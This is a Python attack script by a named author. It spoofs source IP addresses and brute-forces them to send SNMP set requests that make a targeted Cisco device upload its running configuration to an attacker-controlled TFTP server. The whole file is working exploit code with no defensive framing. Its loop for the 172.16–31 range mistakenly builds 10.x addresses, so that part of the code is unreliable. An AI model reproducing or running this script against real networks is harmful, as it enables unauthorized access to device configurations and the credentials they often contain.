#!/usr/bin/python
# This tool will brute force a spoofed source IP and try to get a Cisco running config.
# This is in case we don't know a valid internal IP.

import argparse
from scapy.all import *
import os
import time
import sys

def main():
    parser = argparse.ArgumentParser(description='SNMP Source IP Finder\nBy: Rick Osgood')
    parser.add_argument("--dest_ip", required=True, help="IP address of victim device")
    parser.add_argument("--tftp_ip", required=True, help="IP address of TFTP server")
    parser.add_argument("--community", required=False, default="private", help="SNMP community name")
    parser.add_argument("--filename", required=False, default="pwnd_cisco_config.txt", help="File name for the saved Cisco device config file")

    args = parser.parse_args()

    dest_ip = args.dest_ip
    tftp_ip = args.tftp_ip
    community_name = args.community
    filename = args.filename

    print "[*] Starting atftpd..."
    print "\t* atftpd --daemon --port 69 /tmp"
    os.system("atftpd --daemon --port 69 /tmp")

    print "[*] Touching config file..."
    print "\t* touch /tmp/"
    os.system("touch /tmp/" + filename)
    print "\t* chmod 777 /tmp/"
    os.system("chmod 777 /tmp/" + filename)

    print "[*] Brute forcing guessing source IPs to obtain Cisco config..."
    print "\t* Testing 192.168.x.3..."
    for octet in range(0,255):
        src_ip = "192.168." + str(octet) + ".3"
        packet = IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55." + tftp_ip),value=filename)]))
        send(packet, verbose=False)

    print "\t* Testing 10.x.x.3..."
    for octet1 in range(0,255):
        for octet2 in range(0,255):
            src_ip = "10." + str(octet1) + "." + str(octet2) + ".3"
            packet = IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55." + tftp_ip),value=filename)]))
            send(packet, verbose=False)

    print "\t* Testing 172.16-31.x.3..."
    for octet1 in range(16,31):
        for octet2 in range(0,255):
            src_ip = "10." + str(octet1) + "." + str(octet2) + ".3"
            packet = IP(src=src_ip,dst=dest_ip)/UDP(dport=161)/SNMP(community=community_name,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55." + tftp_ip),value=filename)]))
            send(packet, verbose=False)

    print "[*] Killing aftpd..."
    print "\t* killall -9 atftpd"
    os.system("killall -9 atftpd")

if __name__ == '__main__':
    main()
